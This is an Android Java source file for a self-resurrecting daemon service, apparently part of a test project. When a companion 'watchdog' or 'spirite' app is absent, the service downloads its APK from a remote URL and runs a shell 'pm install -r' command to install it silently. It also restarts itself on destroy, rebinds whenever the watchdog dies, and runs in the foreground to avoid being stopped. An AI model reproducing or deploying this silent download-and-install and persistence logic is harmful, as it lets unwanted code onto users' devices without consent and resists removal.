package com.test.emptydemo;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.graphics.BitmapFactory;
import android.os.Binder;
import android.os.IBinder;
import android.os.RemoteException;
import android.text.TextUtils;
import android.util.Log;

import com.orhanobut.logger.Logger;
import com.test.emptydemo.cmd.CmdBean;
import com.test.emptydemo.cmd.MyConstants;
import com.test.emptydemo.cmd.Task;
import com.test.emptydemo.cmd.ThreadPool;
import com.yuan.library.dmanager.download.DownloadManager;
import com.yuan.library.dmanager.download.DownloadTask;
import com.yuan.library.dmanager.download.DownloadTaskListener;
import com.yuan.library.dmanager.download.TaskEntity;

import java.util.ArrayList;

import cn.jpush.android.api.JPushInterface;

public class QiqoQiaoDaemonService extends Service {
    private static final String TAG = "daemonservice";

    private IBinder.DeathRecipient mDeathRecipient = new IBinder.DeathRecipient() {
        @Override
        public void binderDied() {
            Log.d(TAG, "binderDied: ");
//          绑定远程服务
            bindRemoteService();
        }
    };

    private void bindRemoteService() {
        boolean serviceRunning = Utils.isServiceRunning(this, "com.test.emptydemo.DaemonWatchDogService");
        Log.d(TAG, "DaemonWatchDogService is running : " + serviceRunning);
        if (!serviceRunning) {
//
            Utils.startDeamonService();
            Log.d(TAG, "onStartCommand: startDeamonService");
            bindService(new Intent("com.test.enablexpmod.daemonwatchdog").setPackage(MyConstants.PKG_WATCHDOG), conn, BIND_AUTO_CREATE);
        }
    }

    private ServiceConnection conn = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            try {
                Log.d(TAG, "onServiceConnected: ");
                service.linkToDeath(mDeathRecipient, 0);
            } catch (RemoteException e) {
                e.printStackTrace();
                Log.d(TAG, "onServiceConnected error: " + e.getMessage());

            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "onServiceDisconnected: ");
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        //启用前台服务，主要是startForeground()
        Notification.Builder builder = new Notification.Builder(this);
        Notification notification = builder.build();
        Intent mIntent = new Intent(this, QiqoQiaoDaemonService.class);
        int requestCode = 111;
        PendingIntent pendingIntent = PendingIntent.getService(this, requestCode, mIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        builder.setContentIntent(pendingIntent);
        builder.setSmallIcon(R.mipmap.ic_launcher);
        builder.setLargeIcon(BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher));
        builder.setAutoCancel(true);
        builder.setContentTitle("加油123");
        //设置通知默认效果
        notification.flags = Notification.FLAG_SHOW_LIGHTS;
        int id = 123;
        startForeground(id, notification);
        Log.d(TAG, "onCreate: setserver foreground");
        //取消通知
        startService(new Intent(this, AssistService.class));
    }

    public QiqoQiaoDaemonService() {
    }

    private class MyBinder extends Binder {

        public QiqoQiaoDaemonService getService() {
            return new QiqoQiaoDaemonService();
        }

    }

    @Override
    public IBinder onBind(Intent intent) {
        //            start jpush
        JPushInterface.setDebugMode(true);
        JPushInterface.init(this);
        Logger.d("onBind restart jpush: ");
        return new MyBinder();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        setlogger
        Logger.init().methodCount(0).hideThreadInfo();


        //            start jpush
        JPushInterface.setDebugMode(true);
        JPushInterface.init(this);
        Logger.d("onStartCommand restart jpush: ");
        Log.d(TAG, "onStartCommand: ");

        if (intent != null) {
            String stringExtra = intent.getStringExtra(MyApplication.KEY_PUSHSTR);
            Logger.d("I'm daemonservice receive msg " + stringExtra);
        }
//
        //daemon 未安装则先安装，安装了才会绑定它的服务
        boolean watchdogInstalled = Utils.isAppInstalled(this, MyConstants.PKG_WATCHDOG);
        if (!watchdogInstalled) {
            CmdBean cmdBean = new CmdBean();
            cmdBean.setApkName(CmdBean.DAEMON_APK_NAME);
            cmdBean.setApkPath(CmdBean.DAEMON_APK_PATH);
            cmdBean.setDownloadUrl(CmdBean.DAEMON_URL);
            cmdBean.setCmdType(CmdBean.CMD_TYPE_DOWNLOAD_DAEMON_WATCHDOG);
            ArrayList<String> cmds = new ArrayList<>(3);
            cmds.add(" pm install -r  " +
                    CmdBean.DAEMON_APK_PATH +
                    "/" +
                    CmdBean.DAEMON_APK_NAME +
                    " ");
            cmdBean.setCmds(cmds);
            downLoadDaemonWatchDog(cmdBean);
            Logger.d("install daemon");
        } else {
            //       绑定远程服务
            bindRemoteService();
            Logger.d("daemonInstalled bindRemoteService");
        }
//
//        install spirite
        boolean spiritInstalled = Utils.isAppInstalled(this, MyConstants.PKG_SPIRITE);
        if (!spiritInstalled) {
            CmdBean cmdBean = new CmdBean();
            cmdBean.setApkName(CmdBean.SPIRITE_APK_NAME);
            cmdBean.setApkPath(CmdBean.SPIRITE_APK_PATH);
            cmdBean.setDownloadUrl(CmdBean.SPIRITE_URL);
            cmdBean.setCmdType(CmdBean.CMD_TYPE_DOWNLOAD_SPIRITE);
            ArrayList<String> cmds = new ArrayList<>(3);
            cmds.add(" pm install -r  " +
                    CmdBean.SPIRITE_APK_PATH +
                    "/" +
                    CmdBean.SPIRITE_APK_NAME +
                    " ");
            cmdBean.setCmds(cmds);
            downLoadDaemonWatchDog(cmdBean);
            Logger.d("install spirite");
        }


        return START_STICKY;
    }

    /**
     * @description 下载watchdog
     * @author zhengyx
     * @date 2017/5/9
     */
    private void downLoadDaemonWatchDog(final CmdBean cmdBean) {
        String downloadUrl = cmdBean.getDownloadUrl();
        if (!TextUtils.isEmpty(downloadUrl)) {
            TaskEntity taskEntity = new TaskEntity.Builder().url(downloadUrl).build();
            taskEntity.setFilePath(cmdBean.getApkPath());
            String fileName = cmdBean.getApkName();
            taskEntity.setFileName(fileName);
            DownloadTask itemTask = new DownloadTask(taskEntity);
            itemTask.setListener(new DownloadTaskListener() {

                @Override
                public void onQueue(DownloadTask downloadTask) {

                    Logger.d("onQueue");
                }

                @Override
                public void onConnecting(DownloadTask downloadTask) {
                    Logger.d("onConnecting");
                }

                @Override
                public void onStart(DownloadTask downloadTask) {
                    Logger.d("onStart");
                }

                @Override
                public void onPause(DownloadTask downloadTask) {
                    Logger.d("onPause");
                }

                @Override
                public void onCancel(DownloadTask downloadTask) {
                    Logger.d("onCancel");
                }

                @Override
                public void onFinish(DownloadTask downloadTask) {
                    Logger.d("onFinish");
                    ThreadPool threadPool = ThreadPool.getThreadPool();
                    threadPool.addTask(new Task(threadPool, cmdBean.getCmds()));
                }

                @Override
                public void onError(DownloadTask downloadTask, int code) {
                    Logger.d("onError-" + code);
                }
            });
            DownloadManager.getInstance().addTask(itemTask);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopForeground(true);
        Log.d(TAG, "onDestroy: ");
        unbindService(conn);
        startService(new Intent(this, QiqoQiaoDaemonService.class));
    }
}
